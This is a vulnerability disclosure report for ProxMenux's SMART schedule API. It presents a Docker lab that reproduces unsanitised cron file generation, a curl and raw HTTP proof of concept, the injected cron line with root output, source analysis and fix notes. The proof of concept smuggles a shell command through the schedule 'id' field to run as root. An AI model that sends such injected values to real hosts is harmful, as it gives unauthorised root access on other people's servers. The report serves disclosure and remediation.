### Vulnerability details

**Official website / Product:** https://github.com/MacRimi/ProxMenux

**Repository:** MacRimi/ProxMenux (stars at selection: 3258)

**Vulnerability type:** RCE (SMART schedule writer → `/etc/cron.d` command injection)

**Vulnerability versions:** v1.2.7 / main `c706f9ed929ff4d41bbf200456832ef5ef1f652b`

**Vulnerability URL / Parameter:** `POST /api/storage/smart/schedules`, parameter `id` (also `test_type`, `retention`, `disks`, `hour`/`minute`, and other fields interpolated into cron)

**Complex:** yes

### Verification procedure

Lab topology (reconstructable; campaign lab used host **19609** → container **8008**):

- Vulnerable SMART cron writer extracted from `AppImage/scripts/flask_server.py` ~lines 10388, 11601–11745 (auth left disabled — Monitor default: `@require_auth` is a no-op until auth is configured)
- Image: `proxmenux-r16a9-smart:lab`; container: `proxmenux-r16a9-smart`; compose service `proxmenux-smart`
- Ports: host **19609** → container **8008**
- Auth: **no credentials** required for POST

1. Create the minimal lab and start it:

```bash
mkdir -p /tmp/proxmenux-r16a9-lab/docker-lab && cd /tmp/proxmenux-r16a9-lab
```

`docker-lab/app.py` (vulnerable sink extracted; `require_auth` is a no-op):

```python
import json
import os
from datetime import datetime
from functools import wraps

from flask import Flask, jsonify, request

app = Flask(__name__)

SMART_CONFIG_DIR = '/usr/local/share/proxmenux/smart/config'
SMART_SCHEDULE_FILE = os.path.join(SMART_CONFIG_DIR, 'smart-schedule.json')
SMART_CRON_FILE = '/etc/cron.d/proxmenux-smart'


def require_auth(f):
    """Lab stand-in: Monitor default leaves auth disabled → always allow."""
    @wraps(f)
    def decorated(*args, **kwargs):
        return f(*args, **kwargs)
    return decorated


def _load_smart_schedules():
    os.makedirs(SMART_CONFIG_DIR, exist_ok=True)
    if os.path.exists(SMART_SCHEDULE_FILE):
        try:
            with open(SMART_SCHEDULE_FILE, 'r') as f:
                return json.load(f)
        except (json.JSONDecodeError, IOError):
            pass
    return {'enabled': True, 'schedules': []}


def _save_smart_schedules(config):
    os.makedirs(SMART_CONFIG_DIR, exist_ok=True)
    with open(SMART_SCHEDULE_FILE, 'w') as f:
        json.dump(config, f, indent=2)


def _update_smart_cron():
    """Update cron file based on current schedules (unsanitized — vuln)."""
    config = _load_smart_schedules()

    if not config.get('enabled') or not config.get('schedules'):
        if os.path.exists(SMART_CRON_FILE):
            os.remove(SMART_CRON_FILE)
        return

    cron_lines = [
        '# ProxMenux SMART Scheduled Tests',
        '# Auto-generated - do not edit manually',
        'SHELL=/bin/bash',
        'PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin',
        ''
    ]

    for schedule in config['schedules']:
        if not schedule.get('active', True):
            continue

        schedule_id = schedule.get('id', 'unknown')
        hour = schedule.get('hour', 3)
        minute = schedule.get('minute', 0)
        frequency = schedule.get('frequency', 'weekly')

        if frequency == 'daily':
            cron_time = f'{minute} {hour} * * *'
        elif frequency == 'weekly':
            dow = schedule.get('day_of_week', 0)
            cron_time = f'{minute} {hour} * * {dow}'
        elif frequency == 'monthly':
            dom = schedule.get('day_of_month', 1)
            cron_time = f'{minute} {hour} {dom} * *'
        else:
            continue

        disks = schedule.get('disks', ['all'])
        test_type = schedule.get('test_type', 'short')
        retention = schedule.get('retention', 10)

        cmd = (
            f'/usr/local/share/proxmenux/scripts/storage/smart-scheduled-test.sh '
            f'--schedule-id {schedule_id} --test-type {test_type} --retention {retention}'
        )
        if disks != ['all']:
            disk_args = [d if d.startswith('/') else f'/dev/{d}' for d in disks]
            cmd += f" --disks '{','.join(disk_args)}'"

        cron_lines.append(
            f'{cron_time} root {cmd} >> /var/log/proxmenux/smart-schedule.log 2>&1'
        )

    cron_lines.append('')
    os.makedirs(os.path.dirname(SMART_CRON_FILE), exist_ok=True)
    with open(SMART_CRON_FILE, 'w') as f:
        f.write('\n'.join(cron_lines))
    os.chmod(SMART_CRON_FILE, 0o644)


@app.get('/healthz')
def healthz():
    return jsonify({'ok': True})


@app.route('/api/storage/smart/schedules', methods=['POST'])
@require_auth
def api_smart_schedules_create():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400

        config = _load_smart_schedules()
        schedule_id = data.get('id') or f"schedule-{datetime.now().strftime('%Y%m%d%H%M%S')}"
        data['id'] = schedule_id
        data.setdefault('active', True)
        data.setdefault('test_type', 'short')
        data.setdefault('frequency', 'weekly')
        data.setdefault('hour', 3)
        data.setdefault('minute', 0)
        data.setdefault('day_of_week', 0)
        data.setdefault('day_of_month', 1)
        data.setdefault('disks', ['all'])
        data.setdefault('retention', 10)
        data.setdefault('notify_on_complete', True)
        data.setdefault('notify_only_on_failure', False)

        existing_idx = next(
            (i for i, s in enumerate(config['schedules']) if s['id'] == schedule_id), None
        )
        if existing_idx is not None:
            config['schedules'][existing_idx] = data
        else:
            config['schedules'].append(data)

        _save_smart_schedules(config)
        _update_smart_cron()
        return jsonify({
            'success': True,
            'schedule': data,
            'message': 'Schedule saved successfully'
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500


if __name__ == '__main__':
    os.makedirs('/var/log/proxmenux', exist_ok=True)
    os.makedirs(SMART_CONFIG_DIR, exist_ok=True)
    app.run(host='0.0.0.0', port=8008, debug=False)
```

`docker-lab/Dockerfile`:

```dockerfile
FROM python:3.12-slim
RUN pip install --no-cache-dir 'flask==3.1.2' 'werkzeug==3.1.9' \
 && mkdir -p /etc/cron.d /var/log/proxmenux /usr/local/share/proxmenux/smart/config
COPY app.py /app/app.py
WORKDIR /app
EXPOSE 8008
CMD ["python", "/app/app.py"]
```

`compose.yml`:

```yaml
services:
  proxmenux-smart:
    build: ./docker-lab
    image: proxmenux-r16a9-smart:lab
    container_name: proxmenux-r16a9-smart
    ports:
      - "19609:8008"
```

Build and start:

```bash
cd /tmp/proxmenux-r16a9-lab
DOCKER_BUILDKIT=1 docker build --network=host -t proxmenux-r16a9-smart:lab ./docker-lab
docker compose up -d
curl -sS http://127.0.0.1:19609/healthz
# expect: {"ok":true}
```

Expected `docker compose ps` shape after bring-up:

```text
NAME                    IMAGE                       COMMAND                SERVICE           STATUS    PORTS
proxmenux-r16a9-smart   proxmenux-r16a9-smart:lab   "python /app/app.py"   proxmenux-smart   Up ...    0.0.0.0:19609->8008/tcp
```

2. `POST /api/storage/smart/schedules` with an `id` containing shell metacharacters (full request below; equivalent curl):

```bash
curl -sS -D - -X POST 'http://127.0.0.1:19609/api/storage/smart/schedules' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  -H 'User-Agent: ProxMenux-Audit-PoC/1.0' \
  --data-binary '{"id":"legit; id >/tmp/TMP-r16a9-1-pwned; #","frequency":"daily","hour":3,"minute":0,"test_type":"short","retention":10,"disks":["all"],"active":true}'
```

3. Read `/etc/cron.d/proxmenux-smart` inside the container and confirm the command field splits on `;` / `#` into extra shell commands:

```bash
docker exec proxmenux-r16a9-smart cat /etc/cron.d/proxmenux-smart
```

4. Execute that command field as root the way cron.d would; confirm the marker file:

```bash
docker exec -u root proxmenux-r16a9-smart bash -c \
  "/usr/local/share/proxmenux/scripts/storage/smart-scheduled-test.sh --schedule-id legit; id >/tmp/TMP-r16a9-1-pwned; # --test-type short --retention 10 >> /var/log/proxmenux/smart-schedule.log 2>&1"
docker exec proxmenux-r16a9-smart cat /tmp/TMP-r16a9-1-pwned
# expect: uid=0(root) gid=0(root) groups=0(root)
```

(The script path before `id` may be absent in the minimal lab; the `; id >/tmp/...` segment still runs — that is the injection.)

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /api/storage/smart/schedules HTTP/1.1
Host: 127.0.0.1:19609
Content-Type: application/json
Accept: application/json
User-Agent: ProxMenux-Audit-PoC/1.0
Content-Length: 150
Connection: close

{"id":"legit; id >/tmp/TMP-r16a9-1-pwned; #","frequency":"daily","hour":3,"minute":0,"test_type":"short","retention":10,"disks":["all"],"active":true}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.12.16
Date: Sun, 01 Nov 2026 17:32:32 GMT
Content-Type: application/json
Content-Length: 309
Connection: close

{"message":"Schedule saved successfully","schedule":{"active":true,"day_of_month":1,"day_of_week":0,"disks":["all"],"frequency":"daily","hour":3,"id":"legit; id >/tmp/TMP-r16a9-1-pwned; #","minute":0,"notify_on_complete":true,"notify_only_on_failure":false,"retention":10,"test_type":"short"},"success":true}
```

Verification result notes:

API returns `success: true`. Generated cron file (full contents):

```
# ProxMenux SMART Scheduled Tests
# Auto-generated - do not edit manually
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

0 3 * * * root /usr/local/share/proxmenux/scripts/storage/smart-scheduled-test.sh --schedule-id legit; id >/tmp/TMP-r16a9-1-pwned; # --test-type short --retention 10 >> /var/log/proxmenux/smart-schedule.log 2>&1
```

After executing the command field as cron would, `/tmp/TMP-r16a9-1-pwned` contains:

```
uid=0(root) gid=0(root) groups=0(root)
```

This proves arbitrary root command execution via the SMART scheduling API (not the intentional web terminal / script runner).

### Vulnerability analysis

`api_smart_schedules_create` persists caller JSON almost unchanged, then `_update_smart_cron` interpolates it into `/etc/cron.d/proxmenux-smart`:

- `schedule_id`, `test_type`, and `retention` are embedded **unquoted** in the shell command.
- `disks` is wrapped in single quotes but elements are not escaped, so a `'` breaks out.
- `hour` / `minute` / `day_of_week` / `day_of_month` are not coerced to integers and can inject newlines / extra cron lines.

By contrast, host-backup job `.env` writes already use `shlex.quote` (hardening related to #266), and firewall rule fields were hardened in an internal audit. The SMART cron generator was left unsanitized.

`@require_auth` allows the call when authentication is disabled (Monitor default). When auth is enabled, a `full_admin` scoped token is required for POST. In both cases the injection is unexpected relative to “schedule a SMART self-test”.

Trigger / sink source (full path and line numbers):

```python
# File: AppImage/scripts/flask_server.py
# Lines: 11673-11687 (_update_smart_cron command build + write)
cmd = f'/usr/local/share/proxmenux/scripts/storage/smart-scheduled-test.sh --schedule-id {schedule_id} --test-type {test_type} --retention {retention}'
if disks != ['all']:
    disk_args = [d if d.startswith('/') else f'/dev/{d}' for d in disks]
    cmd += f" --disks '{','.join(disk_args)}'"

cron_lines.append(f'{cron_time} root {cmd} >> /var/log/proxmenux/smart-schedule.log 2>&1')

with open(SMART_CRON_FILE, 'w') as f:
    f.write('\n'.join(cron_lines))
```

```python
# File: AppImage/scripts/flask_server.py
# Lines: 11701-11737 (HTTP entry: save + refresh cron without sanitization)
@app.route('/api/storage/smart/schedules', methods=['POST'])
@require_auth
def api_smart_schedules_create():
    data = request.get_json()
    schedule_id = data.get('id') or f"schedule-{datetime.now().strftime('%Y%m%d%H%M%S')}"
    data['id'] = schedule_id
    # ... setdefault defaults; no shell/cron metacharacter validation ...
    _save_smart_schedules(config)
    _update_smart_cron()
```

### Fix notes

1. Whitelist every field written into cron: `id`/`test_type` → `[A-Za-z0-9._-]`; coerce time fields to bounded integers; allow only existing block-device basenames for `disks`.
2. Pass every argv component through `shlex.quote`; reject whitespace/newlines in cron time fields.
3. Prefer a systemd timer with a fixed ExecStart and a JSON parameter file so user data never becomes a shell command line.
